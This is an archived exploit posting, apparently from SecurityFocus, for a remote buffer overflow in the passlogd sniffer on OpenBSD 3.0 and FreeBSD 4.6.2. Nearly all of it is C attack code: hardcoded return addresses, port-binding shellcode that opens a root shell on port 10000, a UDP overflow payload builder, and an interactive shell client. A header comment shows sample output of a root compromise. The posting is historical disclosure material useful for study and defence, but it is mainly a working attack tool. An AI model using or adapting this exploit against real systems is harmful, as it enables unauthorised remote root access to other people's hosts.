source: http://www.securityfocus.com/bid/7261/info
 
It has been reported that passlogd does not properly handle some types of input. Because of this, an attacker may be able to gain unauthorized access to hosts running the vulnerable software. 

/*
**
** [*] Title: Remote Multiple Buffer Overflow vulnerability in passlogd sniffer
.
** [+] Exploit code: 0x82-Remote.XxxxBSD_passlogd.xpl.c
**
** [+] Description --
**
** FreeBSD includes passlogd-0.1d port:
** http://www.freebsd.org/cgi/ports.cgi?query=passlogd
**
** This exploit works OpenBSD and FreeBSD only.
** General user uses general socket exploit is possible.
**
** [+] Exploit --
** 
** exploit result: --
** 
** bash-2.04$ ./0x82-Remote.XxxxBSD_passlogd.xpl -h61.37.xxx.xx -t0
**
**  XxxxBSD passlogd sniffer remote buffer overflow root exploit
**                                                 by Xpl017Elz.
**
**  [0] Target: OpenBSD 3.0 GENERIC#94 i386
**  [1] Set socket.
**  [2] Make shellcode.
**  [3] Trying 61.37.xxx.xx:10000.
**  [*] Connected to 61.37.xxx.xx:10000.
**  [*] Executed shell successfully !
**
** OpenBSD testsub 3.0 GENERIC#94 i386
** uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operato
r), 20(staff), 31(guest)
** # exit
**  [*] Happy-Exploit
**
** bash-2.04$
**
** -- 
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>. 
** My World: http://x82.i21c.net & http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** This exploit is proof of concept. (Therefore, don't support 'Brute-force' mo
de.)
**
** P.S:
**
** There is reason that do not make integration code that all platform attacks 
are possible.
** Because there was no machine to test exploit.
** Think very regrettably. :-(
**
** But, people who help to me !!!
** I'm thankful very to them. :-)
**
** Greets: Korean Hackers, INetCop Security Team.
**
** Thank you.
**
*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

struct os {
        int num;
        char *ost;
        u_long shell;
        int l_sz;
};

#define Xpl017Elz x82
#define D_M (0)
#define ATK_SIZE (0x8282)

struct os plat[]=
{
        {
                0,"OpenBSD 3.0 GENERIC#94 i386",
                /* My OpenBSD box */
                0xdfbf9104,545
        },
        {
                1,"FreeBSD 4.6.2-RELEASE #0 i386",
                /* It's FreeBSD box :-) */
                0xbfbfaff8,545
        },
        {
                2,NULL,0,0
        }
};

#define TCP_CONN_SOCK (0)
#define UDP_CONN_SOCK (1)

void banrl();
int setsock(char *host,int port,int type);
void re_connt(int sock);
void send_recv_sh(int sock);
void usage(char *p_name);
int make_sh(u_long shcode,int l_sz,int type);
int main(int argc,char **argv)
{
        int sock,whgl,type=D_M;
#define ATK_PT (0x202)
        int atk_port=ATK_PT;
#define D_PORT (10000)
        int d_port=D_PORT;
#define LC_TEST "127.0.0.1" /* localhost */
        char host[0x82]=LC_TEST;
#ifdef T_ADDR_
#define SHELL 0x82828282 /* test */
#endif
        u_long shell=plat[type].shell;
        int l_sz=plat[type].l_sz;
        char *atk_mbuf=(char *)malloc(ATK_SIZE);

        (void)banrl();
        if(argc<2)
        {
                (void)usage(argv[D_M]);
        }

        while((whgl=getopt(argc,argv,"P:p:L:l:H:h:T:t:IiS:s:"))!=-1)
        {
                extern char *optarg;
                switch(whgl)
                {
                        case 'H':
                        case 'h':
                                memset((char *)host,D_M,sizeof(host));
                                strncpy(host,optarg,sizeof(host)-1);
                                break;

                        case 'P':
                        case 'p':
                                atk_port=atoi(optarg);
                                break;

                        case 'L':
                        case 'l':
                                l_sz=atoi(optarg);
                                break;

                        case 'T':
                        case 't':
                                type=atoi(optarg);
                                if(type>1)
                                        (void)usage(argv[D_M]);
                                else
                                {
                                        shell=plat[type].shell;
                                        l_sz=plat[type].l_sz;
                                }
                                break;

                        case 'S':
                        case 's':
                                shell=strtoul(optarg,NULL,NULL);
                                break;

                        case 'I':
                        case 'i':
                                (void)usage(argv[D_M]);
                                break;

                        case '?':
                                fprintf(stderr," Try `%s -i' for more informati
on.\n\n",argv[D_M]);
                                exit(-1);
                                break;
                }
        }

        fprintf(stdout," [0] Target: %s\n",plat[type].ost);
        fprintf(stdout," [1] Set socket.\n");
        sock=(int)setsock(host,atk_port,UDP_CONN_SOCK);
        {
                fprintf(stdout," [2] Make shellcode.\n");
                memset((char *)atk_mbuf,0,ATK_SIZE);
                strncpy(atk_mbuf,(char *)make_sh(shell,l_sz,type),ATK_SIZE-1);
                send(sock,atk_mbuf,strlen(atk_mbuf),0);

                memset((char *)atk_mbuf,0,ATK_SIZE);
                strncpy(atk_mbuf,"\n",strlen("\n"),0);
                send(sock,atk_mbuf,strlen(atk_mbuf),0);

                close(sock);
        }

        fprintf(stdout," [3] Trying %s:%d.\n",host,d_port);
        sleep(2);
        sock=(int)setsock(host,d_port,TCP_CONN_SOCK);
        (void)re_connt(sock);

        fprintf(stdout," [*] Connected to %s:%d.\n",host,d_port);
        (void)send_recv_sh(sock);
}

int make_sh(u_long shcode,int l_sz,int type)
{
        int plus_sz_plus=D_M,pk_sz=D_M;
        char shell_code_bind_10000[]=
                /* 86bytes portbinding shellcode by bighawk */
                "\x31\xc9"              // xor ecx, ecx
                "\xf7\xe1"              // mul ecx
                "\x51"                  // push ecx
                "\x41"                  // inc ecx
                "\x51"                  // push ecx
                "\x41"                  // inc ecx
                "\x51"                  // push ecx
                "\x51"                  // push ecx
                "\xb0\x61"              // mov al, 97
                "\xcd\x80"              // int 80h
                "\x89\xc3"              // mov ebx, eax
                "\x52"                  // push edx
                "\x66\x68\x27\x10"              // push word 4135
                "\x66\x51"              // push cx
                "\x89\xe6"              // mov esi, esp
                "\xb1\x10"              // mov cl, 16
                "\x51"                  // push ecx
                "\x56"                  // push esi
                "\x50"                  // push eax
                "\x50"                  // push eax
                "\xb0\x68"              // mov al, 104
                "\xcd\x80"              // int 80h
                "\x51"                  // push ecx
                "\x53"                  // push ebx
                "\x53"                  // push ebx
                "\xb0\x6a"              // mov al, 106
                "\xcd\x80"              // int 80h
                "\x52"                  // push edx
                "\x52"                  // push edx
                "\x53"                  // push ebx
                "\x53"                  // push ebx
                "\xb0\x1e"              // mov al, 30
                "\xcd\x80"              // int 80h
                "\xb1\x03"              // mov cl, 3
                "\x89\xc3"              // mov ebx, eax
                "\xb0\x5a"              // mov al, 90
                "\x49"                  // dec ecx
                "\x51"                  // push ecx
                "\x53"                  // push ebx
                "\x53"                  // push ebx
                "\xcd\x80"              // int 80h
                "\x41"                  // inc ecx
                "\xe2\xf5"              // loop-10
                "\x51"                  // push ecx
                "\x68\x2f\x2f\x73\x68"  // push dword 68732f2fh
                "\x68\x2f\x62\x69\x6e"  // push dword 6e69622fh
                "\x89\xe3"              // mov  ebx, esp
                "\x51"                  // push ecx
                "\x54"                  // push esp
                "\x53"                  // push ebx
                "\x53"                  // push ebx
                "\xb0\x3b"              // mov al, 59
                "\xcd\x80"              // int  80h
                "\x0a";
        char sh_data_align_4[0x400];
#define NULL_NULL_PSH 0x00
        memset((char *)sh_data_align_4,NULL_NULL_PSH,sizeof(sh_data_align_4));
#define OFF_SET_PSH 0x70
#define NOP_NOP_PSH_ 0x90
        for(pk_sz=D_M;pk_sz<l_sz;pk_sz++)
                sh_data_align_4[pk_sz]=OFF_SET_PSH;
        {
                sh_data_align_4[pk_sz++]=(shcode>>0)&0xff;
                sh_data_align_4[pk_sz++]=(shcode>>8)&0xff;
                sh_data_align_4[pk_sz++]=(shcode>>16)&0xff;
                sh_data_align_4[pk_sz++]=(shcode>>24)&0xff;
                sh_data_align_4[pk_sz++]=(0x3e);
        }
        for(plus_sz_plus=D_M;
                plus_sz_plus<sizeof(sh_data_align_4)-
                strlen(sh_data_align_4)-
                strlen(shell_code_bind_10000);
                plus_sz_plus++)
                sh_data_align_4[pk_sz++]=NOP_NOP_PSH_;
        for(plus_sz_plus=D_M;
                plus_sz_plus<strlen(shell_code_bind_10000);
                plus_sz_plus++)
                sh_data_align_4[pk_sz++]=shell_code_bind_10000[plus_sz_plus];
        return strdup(sh_data_align_4);
}

int setsock(char *hostip,int port,int type)
{
        int sock;
        struct hostent *he;
        struct sockaddr_in x82;

        if((he=gethostbyname(hostip))==NULL)
        {
                return(-1);
        }

        if(type)
        {
                if((sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP))==-1)
                {
                        return(-1);
                }
        }
        else
        {
                if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
                {
                        return(-1);
                }
        }

        x82.sin_family=AF_INET;
        x82.sin_port=htons(port);
        x82.sin_addr=*((struct in_addr *)he->h_addr);
        memset(&(x82.sin_zero),0,8);

        if(connect(sock,(struct sockaddr *)&x82,sizeof(struct sockaddr))==-1)
        {
                return(-1);
        }
        return(sock);
}

void re_connt(int sock)
{
        if(sock==-1)
        {
                fprintf(stderr," [-] Connect Failed.\n\n");
                exit(-1);
        }
}

void send_recv_sh(int sock)
{
        int pk;
        struct timeval tm;
        char *t_cmd="uname -a;id;exec sh -i\n";
        char rbuf[1024];
        fd_set rset;
        memset((char *)rbuf,D_M,sizeof(rbuf));
        fprintf(stdout," [*] Executed shell successfully !\n\n");
        send(sock,t_cmd,strlen(t_cmd),D_M);

        tm.tv_sec=10;
        tm.tv_usec=D_M;

        while(1)
        {
                fflush(stdout);
                FD_ZERO(&rset);
                FD_SET(sock,&rset);
                FD_SET(STDIN_FILENO,&rset);

                select(sock+1,&rset,NULL,NULL,&tm);

                if(FD_ISSET(sock,&rset))
                {
                        pk=read(sock,rbuf,sizeof(rbuf)-1);
                        if(pk<=D_M)
                        {
                                fprintf(stdout," [*] Happy-Exploit\n\n");
                                exit(D_M);
                        }
                        rbuf[pk]=D_M;
                        fprintf(stdout,"%s",rbuf);
                }
                if(FD_ISSET(STDIN_FILENO,&rset))
                {
                        pk=read(STDIN_FILENO,rbuf,sizeof(rbuf)-1);
                        if(pk>D_M)
                        {
                                rbuf[pk]=D_M;
                                write(sock,rbuf,pk);
                        }
                }
        }
        return;
}

void usage(char *p_name)
{
        int r_s=D_M;
        fprintf(stdout," Usage: %s -option [argument]\n",p_name);
        fprintf(stdout,"\n\t-h - hostname. (default: localhost)\n");
        fprintf(stdout,"\t-p - udp port number. (default: udp 514)\n");
        fprintf(stdout,"\t-s - &shellcode. (select target)\n");
        fprintf(stdout,"\t-l - buf len. (select target)\n");
        fprintf(stdout,"\t-t - target number.\n");
        fprintf(stdout,"\t-i - help information.\n\n");
        fprintf(stdout," Select target number:\n\n");

        for(;;)
        {
                if(plat[r_s].ost==NULL)
                        break;
                else fprintf(stdout,"\t{%d} %s\n",plat[r_s].num,plat[r_s].ost);
                r_s++;
        }
        fprintf(stdout,"\n Example> %s -hblah -p514 -s0x82828282 -l582\n\n",p_n
ame);
        exit(-1);
}

void banrl()
{
        fprintf(stdout,"\n XxxxBSD passlogd sniffer remote buffer overflow root
 exploit\n");
        fprintf(stdout,"                                                by Xpl0
17Elz.\n\n");
}




